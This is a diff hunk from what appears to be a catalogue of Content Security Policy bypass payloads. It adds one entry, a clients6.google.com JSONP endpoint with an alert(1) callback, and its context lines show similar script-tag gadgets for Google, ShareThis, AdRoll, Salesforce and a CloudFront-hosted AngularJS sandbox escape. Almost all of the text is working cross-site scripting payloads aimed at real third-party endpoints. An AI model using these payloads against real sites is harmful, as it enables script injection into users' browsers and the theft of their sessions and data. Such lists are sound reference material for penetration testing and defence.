@@ -73,6 +73,7 @@ content.akamai.com	<script src="https://content.akamai.com/index.php/form/getFor
 count-server.sharethis.com	<script src="https://count-server.sharethis.com/v2.0/get_counts?cb=alert"></script>
 cse.google.com	<script src="https://cse.google.com/cse/element/v1?cx=000470283453218169915:hcrzdwsiwrc&callback=alert"></script>
 clients1.google.com	<script src="http://clients1.google.com/complete/search?callback=alert&q=PIC&nolabels=t&client=youtube&ds=yt&_=1361575554883"></script>
+clients6.google.com	<script src="https://clients6.google.com/drive/v2beta/files?callback=alert(1)"></script>
 d.adroll.com	<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV3X4ZNCUZFMLN5KKOD&jsonp=alert(document.domain)"></script>
 d.la3-c2-ia5.salesforceliveagent.com	<script src="https://d.la3-c2-ia5.salesforceliveagent.com/chat/rest/EmbeddedService/EmbeddedServiceConfig.jsonp?org_id=00D40000000MvPv&EmbeddedServiceConfig.configName=Support_Brandfolder_Chat_Agents&callback=alert&version=48"></script>
 d1xrp9zhb3ks3c.cloudfront.net	<body ng-app ng-csp><script src="https://d1xrp9zhb3ks3c.cloudfront.net/web/changessalon/node_modules/angular/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
